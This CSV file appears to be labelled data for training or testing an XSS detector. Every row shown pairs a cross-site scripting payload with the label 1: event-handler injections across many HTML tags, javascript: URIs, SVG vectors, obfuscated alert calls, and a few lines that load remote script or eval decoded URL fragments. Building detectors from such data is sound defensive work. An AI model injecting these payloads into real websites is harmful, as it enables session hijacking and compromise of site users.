input,label
<math><brute href=javascript:alert(1)>click,1
<form action=javascript:alert(1)><input type=submit>,1
<isindex action=javascript:alert(1) type=submit value=click>,1
<form><button formaction=javascript:alert(1)>click,1
<form><input formaction=javascript:alert(1) type=submit value=click>,1
<form><input formaction=javascript:alert(1) type=image value=click>,1
<form><input formaction=javascript:alert(1) type=image src=SOURCE>,1
<isindex formaction=javascript:alert(1) type=submit value=click>,1
<object data=javascript:alert(1)>,1
<iframe srcdoc=<svg/onload=alert(1)>>,1
"<svg><script xlink:href=data:,alert(1) />",1
<math><brute xlink:href=javascript:alert(1)>click,1
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,1
<html ontouchstart=alert(1)>,1
<html ontouchend=alert(1)>,1
<html ontouchmove=alert(1)>,1
<html ontouchcancel=alert(1)>,1
<body onorientationchange=alert(1)>,1
"""><img src=1 onerror=alert(1)>.gif",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",1
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,1
"<script src=""data:,alert(1)//",1
"""><script src=data:,alert(1)//",1
"<script src=""//brutelogic.com.br/1.js#",1
"""><script src=//brutelogic.com.br/1.js#",1
"<link rel=import href=""data:text/html,<script>alert(1)</script>",1
"""><link rel=import href=data:text/html,<script>alert(1)</script>",1
<base href=//0>,1
"<script/src=""data:,eval(atob(location.hash.slice(1)))//#alert(1)",1
<body onload=alert(1)>,1
<body onpageshow=alert(1)>,1
<body onfocus=alert(1)>,1
<body onhashchange=alert(1)><a href=#x>click this!#x,1
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x,1
<body onscroll=alert(1)><br><br><br><br>,1
<br><br><br><br><br><br><br><br><br><br>,1
<br><br><br><br><br><br><br><br><br><br>,1
<br><br><br><br><br><br><x id=x>#x,1
<body onresize=alert(1)>press F12!,1
<body onhelp=alert(1)>press F1! (MSIE),1
<marquee onstart=alert(1)>,1
<marquee loop=1 width=0 onfinish=alert(1)>,1
<audio src onloadstart=alert(1)>,1
<video onloadstart=alert(1)><source>,1
<input autofocus onblur=alert(1)>,1
<keygen autofocus onfocus=alert(1)>,1
<form onsubmit=alert(1)><input type=submit>,1
<select onchange=alert(1)><option>1<option>2,1
<menu id=x contextmenu=x onshow=alert(1)>right click me!,1
alert`1`,1
alert(1),1
alert(1),1
alert(1),1
(alert)(1),1
"a=alert,a(1)",1
[1].find(alert),1
"top[""al""+""ert""](1)",1
top[/al/.source+/ert/.source](1),1
alert(1),1
top['al\145rt'](1),1
top['al\x65rt'](1),1
top[8680439..toString(30)](1),1
navigator.vibrate(500),1
eval(URL.slice(-8))>#alert(1),1
eval(location.hash.slice(1)>#alert(1),1
innerHTML=location.hash>#<script>alert(1)</script>,1
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragend=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",1
"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",1
<a id=x tabindex=1 onactivate=alert(1)></a>,1
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,1
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>,1
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,1
<a id=x tabindex=1 onfocus=alert(1)></a>,1
<a id=x tabindex=1 onfocusin=alert(1)></a>,1
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",1
"<a onbeforecut=""alert(1)"" contenteditable>test</a>",1
"<a onbeforepaste=""alert(1)"" contenteditable>test</a>",1
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,1
"<a onclick=""alert(1)"">test</a>",1
"<a oncontextmenu=""alert(1)"">test</a>",1
"<a oncopy=""alert(1)"" contenteditable>test</a>",1
"<a oncut=""alert(1)"" contenteditable>test</a>",1
"<a ondblclick=""alert(1)"">test</a>",1
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,1
"<a onkeydown=""alert(1)"" contenteditable>test</a>",1
"<a onkeypress=""alert(1)"" contenteditable>test</a>",1
"<a onkeyup=""alert(1)"" contenteditable>test</a>",1
"<a onmousedown=""alert(1)"">test</a>",1
"<a onmouseenter=""alert(1)"">test</a>",1
"<a onmouseleave=""alert(1)"">test</a>",1
"<a onmousemove=""alert(1)"">test</a>",1
"<a onmouseout=""alert(1)"">test</a>",1
"<a onmouseover=""alert(1)"">test</a>",1
"<a onmouseup=""alert(1)"">test</a>",1
"<a onpaste=""alert(1)"" contenteditable>test</a>",1
"<abbr draggable=""true"" ondrag=""alert(1)"">test</abbr>",1
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",1
"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>",1
"<abbr draggable=""true"" ondragleave=""alert(1)"">test</abbr>",1
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",1
<abbr id=x tabindex=1 onactivate=alert(1)></abbr>,1
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,1
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>,1
<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,1
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,1
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,1
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",1
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",1
"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>",1
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,1
"<abbr onclick=""alert(1)"">test</abbr>",1
"<abbr oncontextmenu=""alert(1)"">test</abbr>",1
"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",1
"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",1
"<abbr ondblclick=""alert(1)"">test</abbr>",1
<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>,1
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",1
"<abbr onkeypress=""alert(1)"" contenteditable>test</abbr>",1
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",1
"<abbr onmousedown=""alert(1)"">test</abbr>",1
"<abbr onmouseenter=""alert(1)"">test</abbr>",1
"<abbr onmouseleave=""alert(1)"">test</abbr>",1
"<abbr onmousemove=""alert(1)"">test</abbr>",1
"<abbr onmouseout=""alert(1)"">test</abbr>",1
"<abbr onmouseover=""alert(1)"">test</abbr>",1
"<abbr onmouseup=""alert(1)"">test</abbr>",1
"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",1
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",1
"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>",1
"<acronym draggable=""true"" ondragenter=""alert(1)"">test</acronym>",1
"<acronym draggable=""true"" ondragleave=""alert(1)"">test</acronym>",1
"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>",1
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,1
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>,1
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,1
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,1
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,1
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,1
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",1
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",1
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",1
<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>,1
"<acronym onclick=""alert(1)"">test</acronym>",1
"<acronym oncontextmenu=""alert(1)"">test</acronym>",1
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",1
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",1
"<acronym ondblclick=""alert(1)"">test</acronym>",1
<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>,1
"<acronym onkeydown=""alert(1)"" contenteditable>test</acronym>",1
"<acronym onkeypress=""alert(1)"" contenteditable>test</acronym>",1
"<acronym onkeyup=""alert(1)"" contenteditable>test</acronym>",1
"<acronym onmousedown=""alert(1)"">test</acronym>",1
"<acronym onmouseenter=""alert(1)"">test</acronym>",1
"<acronym onmouseleave=""alert(1)"">test</acronym>",1
"<acronym onmousemove=""alert(1)"">test</acronym>",1
"<acronym onmouseout=""alert(1)"">test</acronym>",1
"<acronym onmouseover=""alert(1)"">test</acronym>",1
"<acronym onmouseup=""alert(1)"">test</acronym>",1
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",1
"<address draggable=""true"" ondrag=""alert(1)"">test</address>",1
"<address draggable=""true"" ondragend=""alert(1)"">test</address>",1
"<address draggable=""true"" ondragenter=""alert(1)"">test</address>",1
"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",1
"<address draggable=""true"" ondragstart=""alert(1)"">test</address>",1
<address id=x tabindex=1 onactivate=alert(1)></address>,1
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,1
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>,1
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,1
<address id=x tabindex=1 onfocus=alert(1)></address>,1
<address id=x tabindex=1 onfocusin=alert(1)></address>,1
"<address onbeforecopy=""alert(1)"" contenteditable>test</address>",1
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",1
"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",1
<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>,1
"<address onclick=""alert(1)"">test</address>",1
"<address oncontextmenu=""alert(1)"">test</address>",1
"<address oncopy=""alert(1)"" contenteditable>test</address>",1
"<address oncut=""alert(1)"" contenteditable>test</address>",1
"<address ondblclick=""alert(1)"">test</address>",1
<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>,1
"<address onkeydown=""alert(1)"" contenteditable>test</address>",1
"<address onkeypress=""alert(1)"" contenteditable>test</address>",1
"<address onkeyup=""alert(1)"" contenteditable>test</address>",1
"<address onmousedown=""alert(1)"">test</address>",1
"<address onmouseenter=""alert(1)"">test</address>",1
"<address onmouseleave=""alert(1)"">test</address>",1
"<address onmousemove=""alert(1)"">test</address>",1
"<address onmouseout=""alert(1)"">test</address>",1
"<address onmouseover=""alert(1)"">test</address>",1
"<address onmouseup=""alert(1)"">test</address>",1
"<address onpaste=""alert(1)"" contenteditable>test</address>",1
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",1
"<applet draggable=""true"" ondragend=""alert(1)"">test</applet>",1
"<applet draggable=""true"" ondragenter=""alert(1)"">test</applet>",1
"<applet draggable=""true"" ondragleave=""alert(1)"">test</applet>",1
"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>",1
<applet id=x tabindex=1 onactivate=alert(1)></applet>,1
<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>,1
<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>,1
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,1
<applet id=x tabindex=1 onfocus=alert(1)></applet>,1
<applet id=x tabindex=1 onfocusin=alert(1)></applet>,1
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",1
"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>",1
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",1
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,1
"<applet onclick=""alert(1)"">test</applet>",1
"<applet oncontextmenu=""alert(1)"">test</applet>",1
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",1
"<applet oncut=""alert(1)"" contenteditable>test</applet>",1
"<applet ondblclick=""alert(1)"">test</applet>",1
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,1
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",1
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",1
"<applet onkeyup=""alert(1)"" contenteditable>test</applet>",1
"<applet onmousedown=""alert(1)"">test</applet>",1
"<applet onmouseenter=""alert(1)"">test</applet>",1
"<applet onmouseleave=""alert(1)"">test</applet>",1
"<applet onmousemove=""alert(1)"">test</applet>",1
"<applet onmouseout=""alert(1)"">test</applet>",1
"<applet onmouseover=""alert(1)"">test</applet>",1
"<applet onmouseup=""alert(1)"">test</applet>",1
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",1
<applet onreadystatechange=alert(1)></applet>,1
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",1
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",1
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",1
"<area draggable=""true"" ondragleave=""alert(1)"">test</area>",1
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",1
<area id=x tabindex=1 onactivate=alert(1)></area>,1
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>,1
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,1
<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>,1
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",1
"<area onbeforecut=""alert(1)"" contenteditable>test</area>",1
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",1
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>,1
"<area onclick=""alert(1)"">test</area>",1
"<area oncontextmenu=""alert(1)"">test</area>",1
"<area oncopy=""alert(1)"" contenteditable>test</area>",1
"<area oncut=""alert(1)"" contenteditable>test</area>",1
"<area ondblclick=""alert(1)"">test</area>",1
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,1
"<area onkeydown=""alert(1)"" contenteditable>test</area>",1
"<area onkeypress=""alert(1)"" contenteditable>test</area>",1
"<area onkeyup=""alert(1)"" contenteditable>test</area>",1
"<area onmousedown=""alert(1)"">test</area>",1
"<area onmouseenter=""alert(1)"">test</area>",1
"<area onmouseleave=""alert(1)"">test</area>",1
"<area onmousemove=""alert(1)"">test</area>",1
"<area onmouseout=""alert(1)"">test</area>",1
"<area onmouseover=""alert(1)"">test</area>",1
"<area onmouseup=""alert(1)"">test</area>",1
"<area onpaste=""alert(1)"" contenteditable>test</area>",1
"<article draggable=""true"" ondrag=""alert(1)"">test</article>",1
"<article draggable=""true"" ondragend=""alert(1)"">test</article>",1
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",1
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",1
"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",1
<article id=x tabindex=1 onactivate=alert(1)></article>,1
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>,1
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,1
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,1
<article id=x tabindex=1 onfocus=alert(1)></article>,1
<article id=x tabindex=1 onfocusin=alert(1)></article>,1
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",1
"<article onbeforecut=""alert(1)"" contenteditable>test</article>",1
"<article onbeforepaste=""alert(1)"" contenteditable>test</article>",1
<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>,1
"<article onclick=""alert(1)"">test</article>",1
"<article oncontextmenu=""alert(1)"">test</article>",1
"<article oncopy=""alert(1)"" contenteditable>test</article>",1
"<article oncut=""alert(1)"" contenteditable>test</article>",1
"<article ondblclick=""alert(1)"">test</article>",1
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,1
"<article onkeydown=""alert(1)"" contenteditable>test</article>",1
"<article onkeypress=""alert(1)"" contenteditable>test</article>",1
"<article onkeyup=""alert(1)"" contenteditable>test</article>",1
"<article onmousedown=""alert(1)"">test</article>",1
"<article onmouseenter=""alert(1)"">test</article>",1
"<article onmouseleave=""alert(1)"">test</article>",1
"<article onmousemove=""alert(1)"">test</article>",1
"<article onmouseout=""alert(1)"">test</article>",1
"<article onmouseover=""alert(1)"">test</article>",1
"<article onmouseup=""alert(1)"">test</article>",1
"<article onpaste=""alert(1)"" contenteditable>test</article>",1
"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",1
"<aside draggable=""true"" ondragend=""alert(1)"">test</aside>",1
"<aside draggable=""true"" ondragenter=""alert(1)"">test</aside>",1
"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>",1
"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",1
<aside id=x tabindex=1 onactivate=alert(1)></aside>,1
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,1
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,1
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,1
<aside id=x tabindex=1 onfocus=alert(1)></aside>,1
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,1
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",1
"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>",1
"<aside onbeforepaste=""alert(1)"" contenteditable>test</aside>",1
<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>,1
"<aside onclick=""alert(1)"">test</aside>",1
"<aside oncontextmenu=""alert(1)"">test</aside>",1
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",1
"<aside oncut=""alert(1)"" contenteditable>test</aside>",1
"<aside ondblclick=""alert(1)"">test</aside>",1
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>,1
"<aside onkeydown=""alert(1)"" contenteditable>test</aside>",1
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",1
"<aside onkeyup=""alert(1)"" contenteditable>test</aside>",1
"<aside onmousedown=""alert(1)"">test</aside>",1
"<aside onmouseenter=""alert(1)"">test</aside>",1
"<aside onmouseleave=""alert(1)"">test</aside>",1
"<aside onmousemove=""alert(1)"">test</aside>",1
"<aside onmouseout=""alert(1)"">test</aside>",1
"<aside onmouseover=""alert(1)"">test</aside>",1
"<aside onmouseup=""alert(1)"">test</aside>",1
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",1
"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",1
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",1
"<audio draggable=""true"" ondragenter=""alert(1)"">test</audio>",1
"<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>",1
"<audio draggable=""true"" ondragstart=""alert(1)"">test</audio>",1
"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",1
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",1
<audio id=x tabindex=1 onactivate=alert(1)></audio>,1
<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>,1
<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,1
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>,1
"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>",1
"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",1
"<audio onbeforepaste=""alert(1)"" contenteditable>test</audio>",1
<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>,1
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio onclick=""alert(1)"">test</audio>",1
"<audio oncontextmenu=""alert(1)"">test</audio>",1
"<audio oncopy=""alert(1)"" contenteditable>test</audio>",1
"<audio oncut=""alert(1)"" contenteditable>test</audio>",1
"<audio ondblclick=""alert(1)"">test</audio>",1
<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>,1
"<audio onkeydown=""alert(1)"" contenteditable>test</audio>",1
"<audio onkeypress=""alert(1)"" contenteditable>test</audio>",1
"<audio onkeyup=""alert(1)"" contenteditable>test</audio>",1
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<audio onmousedown=""alert(1)"">test</audio>",1
"<audio onmouseenter=""alert(1)"">test</audio>",1
"<audio onmouseleave=""alert(1)"">test</audio>",1
"<audio onmousemove=""alert(1)"">test</audio>",1
"<audio onmouseout=""alert(1)"">test</audio>",1
"<audio onmouseover=""alert(1)"">test</audio>",1
"<audio onmouseup=""alert(1)"">test</audio>",1
"<audio onpaste=""alert(1)"" contenteditable>test</audio>",1
<audio src/onerror=alert(1)>,1
"<b draggable=""true"" ondrag=""alert(1)"">test</b>",1
"<b draggable=""true"" ondragend=""alert(1)"">test</b>",1
"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",1
"<b draggable=""true"" ondragleave=""alert(1)"">test</b>",1
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",1
<b id=x tabindex=1 onactivate=alert(1)></b>,1
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,1
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,1
<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>,1
<b id=x tabindex=1 onfocus=alert(1)></b>,1
<b id=x tabindex=1 onfocusin=alert(1)></b>,1
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",1
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",1
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",1
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,1
"<b onclick=""alert(1)"">test</b>",1
"<b oncontextmenu=""alert(1)"">test</b>",1
"<b oncopy=""alert(1)"" contenteditable>test</b>",1
"<b oncut=""alert(1)"" contenteditable>test</b>",1
"<b ondblclick=""alert(1)"">test</b>",1
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,1
"<b onkeydown=""alert(1)"" contenteditable>test</b>",1
"<b onkeypress=""alert(1)"" contenteditable>test</b>",1
"<b onkeyup=""alert(1)"" contenteditable>test</b>",1
"<b onmousedown=""alert(1)"">test</b>",1
"<b onmouseenter=""alert(1)"">test</b>",1
"<b onmouseleave=""alert(1)"">test</b>",1
"<b onmousemove=""alert(1)"">test</b>",1
"<b onmouseout=""alert(1)"">test</b>",1
"<b onmouseover=""alert(1)"">test</b>",1
"<b onmouseup=""alert(1)"">test</b>",1
"<b onpaste=""alert(1)"" contenteditable>test</b>",1
"<base draggable=""true"" ondrag=""alert(1)"">test</base>",1
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",1
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",1
"<base draggable=""true"" ondragleave=""alert(1)"">test</base>",1
"<base draggable=""true"" ondragstart=""alert(1)"">test</base>",1
<base id=x tabindex=1 onactivate=alert(1)></base>,1
<base id=x tabindex=1 onbeforeactivate=alert(1)></base>,1
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,1
<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>,1
<base id=x tabindex=1 onfocus=alert(1)></base>,1
<base id=x tabindex=1 onfocusin=alert(1)></base>,1
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1
"<base onbeforecut=""alert(1)"" contenteditable>test</base>",1
"<base onbeforepaste=""alert(1)"" contenteditable>test</base>",1
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,1
"<base onclick=""alert(1)"">test</base>",1
"<base oncontextmenu=""alert(1)"">test</base>",1
"<base oncopy=""alert(1)"" contenteditable>test</base>",1
"<base oncut=""alert(1)"" contenteditable>test</base>",1
"<base ondblclick=""alert(1)"">test</base>",1
<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>,1
"<base onkeydown=""alert(1)"" contenteditable>test</base>",1
"<base onkeypress=""alert(1)"" contenteditable>test</base>",1
"<base onkeyup=""alert(1)"" contenteditable>test</base>",1
"<base onmousedown=""alert(1)"">test</base>",1
